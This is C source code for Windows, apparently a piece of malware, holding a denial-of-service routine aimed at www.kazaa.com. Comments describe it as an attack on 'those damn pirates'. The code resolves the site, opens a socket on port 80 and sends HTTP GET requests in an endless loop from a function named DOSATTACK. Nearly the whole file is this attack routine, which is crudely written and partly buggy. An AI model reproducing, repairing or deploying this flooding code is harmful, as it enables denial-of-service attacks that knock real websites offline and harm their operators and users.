
#define WIN32_LEAN_AND_MEAN //do not add any MFC bullshit
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")


#define site "www.kazaa.com"  //perform dos on kazaa.com, those damn pirates 
#define PORT 80

//connect to the site and send get request
static int connect_c(struct sockaddr_in *addr)
{


SOCKET sock;

sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
connect(sock, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
for(;;)
{
send(sock,"GET / HTTP/1.1\r\n Host: www.kazaa.com\r\n ",1000,0); 
Sleep(320);
}
return 0;

}
//ip address resolver. uses gethostbyname api to get ip of site from dns
static unsigned long resolve(char *website)
{
unsigned long addy = inet_addr(website);
if (addy == 0xFFFFFFFF || (addy == 0 && website[0] != '0')) {
struct hostent *host = gethostbyname(website);
if (host != NULL)
addy = *(unsigned long *)host->h_addr_list[0];
}
if (addy == 0xFFFFFFFF) addy = 0;
return addy;
}
//main code for dos attack
int attacksite()
{

struct sockaddr_in addr;


WSADATA data;
WSAStartup(MAKEWORD(2,0), &data);


memset(&addr, '\0', sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = resolve(site);
addr.sin_port = htons(PORT);

connect_c(&addr);
return 0;

}
//main thread for dos attack
DWORD _stdcall DOSATTACK(LPVOID th)
{
	
	int i;
#define numthreads 100

	for(i=1; i<numthreads; i++) //for loop that launches attack thread 100 times
		attacksite();
return 0; //just return null
	
}